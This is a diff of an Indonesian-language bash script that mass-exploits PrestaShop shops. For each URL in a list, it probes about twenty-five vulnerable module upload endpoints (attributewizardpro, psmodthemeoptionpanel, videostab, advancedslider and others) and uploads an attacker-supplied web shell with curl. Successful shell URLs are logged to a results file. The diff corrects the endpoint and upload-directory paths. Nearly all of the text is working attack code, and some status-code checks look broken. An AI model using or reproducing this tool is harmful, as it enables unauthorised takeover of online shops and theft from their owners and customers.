@@ -34,13 +34,31 @@ echo -n "Masukan Shell : "; read fshell;
 banyak=$(cat "${list}" | wc -l);
 printf "${red}LIST KAMAR TERLIHAT${white} ${banyak}\n ${NC}"
 
-moduleslist=("columnadverts" "soopamobile" "soopabanners" \
-				"vtermslideshow" "vtemslideshow" "simpleslideshow" "productpageadverts" \
-				"homepageadvertise" "homepageadvertise2" "jro_homepageadvertise" \
-				"attributewizardpro" "1attributewizardpro" "attributewizardpro2" "attributewizardpro_x" \
-				"psmodthemeoptionpanel" "tdpsthemeoptionpanel" "megamenu" "nvn_export_orders" "pk_flexmenu" "wdoptionpanel" \
-				"fieldvmegamenu" "wg24themeadministration" "videostab" "cartabandonmentproOld" "cartabandonmentpro" "advancedslider" \
-				"attributewizardpro3" "jro_homepageadvertise" "soopabanners" "soopamobile" )
+moduleslist=("columnadverts" \
+			"soopamobile" \
+			"soopabanners" \
+			"vtermslideshow" \
+			"vtemslideshow" \
+			"simpleslideshow" \
+			"productpageadverts" \
+			"homepageadvertise" \
+			"homepageadvertise2" \
+			"jro_homepageadvertise" \
+			"attributewizardpro" \
+			"1attributewizardpro" \
+			"attributewizardpro.OLD" \
+			"psmodthemeoptionpanel" \
+			"tdpsthemeoptionpanel" \
+			"nvn_export_orders" \
+			"pk_flexmenu" \
+			"wdoptionpanel" \
+			"fieldvmegamenu" \
+			"wg24themeadministration" \
+			"videostab" \
+			"cartabandonmentproOld" \
+			"cartabandonmentpro" \
+			"advancedslider" \
+			"attributewizardpro_x")
 slist=$list
 while zerobyte= read -r url
 do 
@@ -368,12 +386,12 @@ elif
 	echo "JENDELA ${moduleslist[13]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[13]}"
 	# Save URL
-	liatxploit13=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[13]}/file_upload.php" | egrep -o "success")
+	liatxploit13=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[13]}/psmodthemeoptionpanel_ajax.php" | egrep -o "success")
 if [ "success" == "${liatxploit13}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[13]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[13]}/upload/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -381,23 +399,23 @@ else
 	echo "MODULE ${moduleslist[13]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar14=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[14]}/file_upload.php")
-	intip14=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[14]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar14=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[14]}/psmodthemeoptionpanel_ajax.php")
+	intip14=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[14]}/psmodthemeoptionpanel_ajax.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar14}" ] || [ "000" == "${kamar14}" ] || [ "403" == "${kamar14}" ] || [ "301" == "${kamar14}" ] || [ "500" == "${kamar14}" ] || [ "302" == "${kamar14}" ]; then
 		echo "JENDELA ${moduleslist[14]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "200" == "${kamar14}" ] && [ "error" == "${intip14}" ]; then
 	echo "JENDELA ${moduleslist[14]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[14]}"
 	# Save URL
-	liatxploit14=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[14]}/file_upload.php" | egrep -o "success")
+	liatxploit14=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[14]}/tdpsthemeoptionpanelAjax.php" | egrep -o "success")
 if [ "success" == "${liatxploit14}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[14]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[14]}/upload/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -405,23 +423,23 @@ else
 	echo "MODULE ${moduleslist[14]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar15=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[15]}/file_upload.php")
-	intip15=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[15]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar15=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[15]}/tdpsthemeoptionpanelAjax.php")
+	intip15=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[15]}/tdpsthemeoptionpanelAjax.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar15}" ] || [ "000" == "${kamar15}" ] || [ "403" == "${kamar15}" ] || [ "301" == "${kamar15}" ] || [ "500" == "${kamar15}" ] || [ "302" == "${kamar15}" ]; then
 		echo "JENDELA ${moduleslist[15]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "200" == "${kamar15}" ] && [ "error" == "${intip15}" ]; then
 	echo "JENDELA ${moduleslist[15]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[15]}"
 	# Save URL
-	liatxploit15=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[15]}/file_upload.php" | egrep -o "success")
+	liatxploit15=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[15]}/upload.php" | egrep -o "success")
 if [ "success" == "${liatxploit15}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[15]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[15]}/nvn_export_orders/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -429,23 +447,23 @@ else
 	echo "MODULE ${moduleslist[15]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar16=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[16]}/file_upload.php")
-	intip16=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[16]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar16=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[16]}/upload.php")
+	intip16=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[16]}/upload.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar16}" ] || [ "000" == "${kamar16}" ] || [ "403" == "${kamar16}" ] || [ "301" == "${kamar16}" ] || [ "500" == "${kamar16}" ] || [ "302" == "${kamar16}" ]; then
 		echo "JENDELA ${moduleslist[16]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "200" == "${kamar16}" ] && [ "error" == "${intip16}" ]; then
 	echo "JENDELA ${moduleslist[16]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[16]}"
 	# Save URL
-	liatxploit16=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[16]}/file_upload.php" | egrep -o "success")
+	liatxploit16=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[16]}/ajax/upload.php" | egrep -o "success")
 if [ "success" == "${liatxploit16}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[16]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[16]}/uploads/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -453,47 +471,23 @@ else
 	echo "MODULE ${moduleslist[16]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar17=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[17]}/file_upload.php")
-	intip17=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[17]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar17=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[17]}/ajax/upload.php")
+	intip17=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[17]}/ajax/upload.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar17}" ] || [ "000" == "${kamar17}" ] || [ "403" == "${kamar17}" ] || [ "301" == "${kamar17}" ] || [ "500" == "${kamar17}" ] || [ "302" == "${kamar17}" ]; then
 		echo "JENDELA ${moduleslist[17]} TERTUTUP" 
-#false 
-elif
-	[ "200" == "${kamar17}" ] && [ "error" == "${intip17}" ]; then
-	echo "JENDELA ${moduleslist[17]} TERBUKA"
-	echo "USAHA NGITIPIN ${moduleslist[17]}"
-	# Save URL
-	liatxploit17=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[17]}/file_upload.php" | egrep -o "success")
-if [ "success" == "${liatxploit17}" ]; then
-	printf ${cyan}
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[17]}/file_uploads/${fshell}" | tee -a hasil.txt
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-fi 
-else
-	printf ${red}
-	echo "MODULE ${moduleslist[17]} TERGEMBOK"
-	fi
-	printf ${NC}
-	kamar18=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[18]}/file_upload.php")
-	intip18=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[18]}/file_upload.php" 2>&1 | egrep -o "error") 
-	#sleep 1
-	if [ "404" == "${kamar18}" ] || [ "000" == "${kamar18}" ] || [ "403" == "${kamar18}" ] || [ "301" == "${kamar18}" ] || [ "500" == "${kamar18}" ] || [ "302" == "${kamar18}" ]; then
-		echo "JENDELA ${moduleslist[18]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "200" == "${kamar18}" ] && [ "error" == "${intip18}" ]; then
 	echo "JENDELA ${moduleslist[18]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[18]}"
 	# Save URL
-	liatxploit18=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[18]}/file_upload.php" | egrep -o "success")
+	liatxploit18=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[18]}/wdoptionpanel_ajax.php" | egrep -o "success")
 if [ "success" == "${liatxploit18}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[18]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[18]}/upload/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -501,23 +495,23 @@ else
 	echo "MODULE ${moduleslist[18]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar19=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[19]}/file_upload.php")
-	intip19=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[19]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar19=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[19]}/wdoptionpanel_ajax.php")
+	intip19=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[19]}/wdoptionpanel_ajax.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar19}" ] || [ "000" == "${kamar19}" ] || [ "403" == "${kamar19}" ] || [ "301" == "${kamar19}" ] || [ "500" == "${kamar19}" ] || [ "302" == "${kamar19}" ]; then
 		echo "JENDELA ${moduleslist[19]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "200" == "${kamar19}" ] && [ "error" == "${intip19}" ]; then
 	echo "JENDELA ${moduleslist[19]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[19]}"
 	# Save URL
-	liatxploit19=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[19]}/file_upload.php" | egrep -o "success")
+	liatxploit19=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[19]}/ajax/upload.php" | egrep -o "success")
 if [ "success" == "${liatxploit19}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[19]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[19]}/uploads/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -525,23 +519,23 @@ else
 	echo "MODULE ${moduleslist[19]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar20=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[20]}/file_upload.php")
-	intip20=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[20]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar20=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[20]}/ajax/upload.php")
+	intip20=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[20]}/ajax/upload.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar20}" ] || [ "000" == "${kamar20}" ] || [ "403" == "${kamar20}" ] || [ "301" == "${kamar20}" ] || [ "500" == "${kamar20}" ] || [ "302" == "${kamar20}" ]; then
 		echo "JENDELA ${moduleslist[20]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "210" == "${kamar20}" ] && [ "error" == "${intip20}" ]; then
 	echo "JENDELA ${moduleslist[20]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[20]}"
 	# Save URL
-	liatxploit20=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[20]}/file_upload.php" | egrep -o "success")
+	liatxploit20=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[20]}/wg24_ajax.php" | egrep -o "success")
 if [ "success" == "${liatxploit20}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[20]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[20]}/img/upload/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -549,23 +543,23 @@ else
 	echo "MODULE ${moduleslist[20]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar21=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[21]}/file_upload.php")
-	intip21=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[21]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar21=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[21]}/wg24_ajax.php")
+	intip21=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[21]}/wg24_ajax.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar21}" ] || [ "000" == "${kamar21}" ] || [ "403" == "${kamar21}" ] || [ "301" == "${kamar21}" ] || [ "500" == "${kamar21}" ] || [ "302" == "${kamar21}" ]; then
 		echo "JENDELA ${moduleslist[21]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "221" == "${kamar21}" ] && [ "error" == "${intip21}" ]; then
 	echo "JENDELA ${moduleslist[21]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[21]}"
 	# Save URL
-	liatxploit21=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[21]}/file_upload.php" | egrep -o "success")
+	liatxploit21=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[21]}/ajax_videostab.php?action=submitUploadVideo%26id_product=upload" | egrep -o "success")
 if [ "success" == "${liatxploit21}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[21]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[21]}/uploads/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -573,23 +567,23 @@ else
 	echo "MODULE ${moduleslist[21]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar22=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[22]}/file_upload.php")
-	intip22=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[22]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar22=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[22]}/ajax_videostab.php?action=submitUploadVideo%26id_product=upload")
+	intip22=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[22]}/ajax_videostab.php?action=submitUploadVideo%26id_product=upload" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar22}" ] || [ "000" == "${kamar22}" ] || [ "403" == "${kamar22}" ] || [ "301" == "${kamar22}" ] || [ "500" == "${kamar22}" ] || [ "302" == "${kamar22}" ]; then
 		echo "JENDELA ${moduleslist[22]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "231" == "${kamar22}" ] && [ "error" == "${intip22}" ]; then
 	echo "JENDELA ${moduleslist[22]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[22]}"
 	# Save URL
-	liatxploit22=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[22]}/file_upload.php" | egrep -o "success")
+	liatxploit22=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[22]}/upload.php" | egrep -o "success")
 if [ "success" == "${liatxploit22}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[22]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[22]}/uploads/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -597,23 +591,23 @@ else
 	echo "MODULE ${moduleslist[22]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar23=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[23]}/file_upload.php")
-	intip23=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[23]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar23=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[23]}/upload.php")
+	intip23=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[23]}/upload.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar23}" ] || [ "000" == "${kamar23}" ] || [ "403" == "${kamar23}" ] || [ "301" == "${kamar23}" ] || [ "500" == "${kamar23}" ] || [ "302" == "${kamar23}" ]; then
 		echo "JENDELA ${moduleslist[23]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "241" == "${kamar23}" ] && [ "error" == "${intip23}" ]; then
 	echo "JENDELA ${moduleslist[23]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[23]}"
 	# Save URL
-	liatxploit23=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[23]}/file_upload.php" | egrep -o "success")
+	liatxploit23=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[23]}/upload.php" | egrep -o "success")
 if [ "success" == "${liatxploit23}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[23]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[23]}/uploads/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -621,23 +615,23 @@ else
 	echo "MODULE ${moduleslist[23]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar24=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[24]}/file_upload.php")
-	intip24=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[24]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar24=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[24]}/upload.php")
+	intip24=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[24]}/upload.php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar24}" ] || [ "000" == "${kamar24}" ] || [ "403" == "${kamar24}" ] || [ "301" == "${kamar24}" ] || [ "500" == "${kamar24}" ] || [ "302" == "${kamar24}" ]; then
 		echo "JENDELA ${moduleslist[24]} TERTUTUP" 
-#false 
+#false
 elif
 	[ "251" == "${kamar24}" ] && [ "error" == "${intip24}" ]; then
 	echo "JENDELA ${moduleslist[24]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[24]}"
 	# Save URL
-	liatxploit24=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[24]}/file_upload.php" | egrep -o "success")
+	liatxploit24=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[24]}/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php" | egrep -o "success")
 if [ "success" == "${liatxploit24}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[24]}/file_uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[24]}/uploads/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
@@ -645,14 +639,14 @@ else
 	echo "MODULE ${moduleslist[24]} TERGEMBOK"
 	fi
 	printf ${NC}
-	kamar25=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[25]}/file_upload.php")
-	intip25=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[25]}/file_upload.php" 2>&1 | egrep -o "error") 
+	kamar25=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[25]}/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php")
+	intip25=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[25]}/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php" 2>&1 | egrep -o "error") 
 	#sleep 1
 	if [ "404" == "${kamar25}" ] || [ "000" == "${kamar25}" ] || [ "403" == "${kamar25}" ] || [ "301" == "${kamar25}" ] || [ "500" == "${kamar25}" ] || [ "302" == "${kamar25}" ]; then
 		echo "JENDELA ${moduleslist[25]} TERTUTUP" 
-#false 
+#false
 elif
-	[ "261" == "${kamar25}" ] && [ "error" == "${intip25}" ]; then
+	[ "200" == "${kamar25}" ] && [ "error" == "${intip25}" ]; then
 	echo "JENDELA ${moduleslist[25]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[25]}"
 	# Save URL
@@ -667,102 +661,6 @@ fi
 else
 	printf ${red}
 	echo "MODULE ${moduleslist[25]} TERGEMBOK"
-	fi
-	printf ${NC}
-	kamar26=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[26]}/file_upload.php")
-	intip26=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[26]}/file_upload.php" 2>&1 | egrep -o "error") 
-	#sleep 1
-	if [ "404" == "${kamar26}" ] || [ "000" == "${kamar26}" ] || [ "403" == "${kamar26}" ] || [ "301" == "${kamar26}" ] || [ "500" == "${kamar26}" ] || [ "302" == "${kamar26}" ]; then
-		echo "JENDELA ${moduleslist[26]} TERTUTUP" 
-#false 
-elif
-	[ "271" == "${kamar26}" ] && [ "error" == "${intip26}" ]; then
-	echo "JENDELA ${moduleslist[26]} TERBUKA"
-	echo "USAHA NGITIPIN ${moduleslist[26]}"
-	# Save URL
-	liatxploit26=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[26]}/file_upload.php" | egrep -o "success")
-if [ "success" == "${liatxploit26}" ]; then
-	printf ${cyan}
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[26]}/file_uploads/${fshell}" | tee -a hasil.txt
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-fi 
-else
-	printf ${red}
-	echo "MODULE ${moduleslist[26]} TERGEMBOK"
-	fi
-	printf ${NC}
-	kamar27=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[27]}/file_upload.php")
-	intip27=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[27]}/file_upload.php" 2>&1 | egrep -o "error") 
-	#sleep 1
-	if [ "404" == "${kamar27}" ] || [ "000" == "${kamar27}" ] || [ "403" == "${kamar27}" ] || [ "301" == "${kamar27}" ] || [ "500" == "${kamar27}" ] || [ "302" == "${kamar27}" ]; then
-		echo "JENDELA ${moduleslist[27]} TERTUTUP" 
-#false 
-elif
-	[ "281" == "${kamar27}" ] && [ "error" == "${intip27}" ]; then
-	echo "JENDELA ${moduleslist[27]} TERBUKA"
-	echo "USAHA NGITIPIN ${moduleslist[27]}"
-	# Save URL
-	liatxploit27=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[27]}/file_upload.php" | egrep -o "success")
-if [ "success" == "${liatxploit27}" ]; then
-	printf ${cyan}
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-	echo "!!! TERLIHAT SUDAH !!!"
